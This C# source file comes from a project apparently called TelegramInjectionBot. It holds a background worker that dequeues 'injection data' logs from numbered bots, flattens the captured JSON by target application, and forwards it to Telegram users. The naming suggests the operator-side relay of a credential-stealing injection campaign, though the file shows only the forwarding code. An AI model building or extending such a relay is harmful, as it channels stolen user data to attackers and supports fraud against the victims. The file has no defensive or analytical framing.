using System.Text;
using Newtonsoft.Json.Linq;
using TelegramInjectionBot.Services;
using TelegramInjectionBot.Stores;

namespace TelegramInjectionBot.Workers;

public class InjectionToTelegramWorker : BackgroundService
{
    private readonly BotLogStore botLogStore;
    private readonly TelegramBotCustomClient telegramClient;

    public InjectionToTelegramWorker(BotLogStore botLogStore, TelegramBotCustomClient telegramClient)
    {
        this.botLogStore = botLogStore;
        this.telegramClient = telegramClient;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        while (!stoppingToken.IsCancellationRequested)
        {
            await Iteration();

            await Task.Delay(1000, stoppingToken);
        }
    }

    protected async Task Iteration()
    {
        UserBotLog userBotLog;


        if (botLogStore.BotLogs.Count > 0)
        {
            botLogStore.BotLogs.TryDequeue(out userBotLog);

            var message = $"New injection data from bot{userBotLog.Log.BotId}\n" +
                          $"application: {userBotLog.Log.Application}\n" +
                          "Inject data:\n"
                          + $"{JsonToString(userBotLog.Log.Log)}";

            telegramClient.SendMessage(userBotLog.TelegramId, message);
        }
    }

    public static string JsonToString(string JsonString)
    {
        string result;

        result = ConvertJsonToText(JToken.Parse(JsonString));

        return result;
    }

    // Функция для преобразования объекта JSON в текстовый формат
    private static string ConvertJsonToText(JToken token, string parentKey = "")
    {
        var sb = new StringBuilder();

        if (token.Type == JTokenType.String) token = JToken.Parse(token.ToString());

        if (token.Type == JTokenType.Object)
            foreach (var property in token)
            {
                var propertyName = property.Path;
                var propertyValue = property.First;

                var fullKey = parentKey != "" ? $"{parentKey}.{propertyName}" : propertyName;

                try
                {
                    var jsonToken = JToken.Parse(propertyValue.ToString());
                    sb.Append(ConvertJsonToText(jsonToken, fullKey));
                }
                catch (Exception)
                {
                    sb.AppendLine($"{fullKey}: {propertyValue}");
                }
            }

        return sb.ToString();
    }
}